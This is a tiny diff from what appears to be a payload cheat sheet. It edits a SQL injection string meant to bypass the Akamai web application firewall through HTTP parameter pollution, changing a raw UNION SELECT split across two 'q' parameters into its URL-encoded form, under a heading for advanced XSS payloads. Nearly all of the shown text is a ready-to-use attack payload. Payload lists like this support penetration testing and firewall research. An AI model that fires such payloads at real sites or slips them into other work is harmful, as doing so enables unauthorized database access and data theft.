@@ -48,7 +48,7 @@ Advanced XSS Payloads:
 
 SQL Injection Bypass Akamai WAF Using HPP:
 ------------------------------------------
-q=1'Union DistinctRow/*&q=*/Select 1
+q=1%27Union+DistinctRow/*&q=*/Select+1
 
 
 
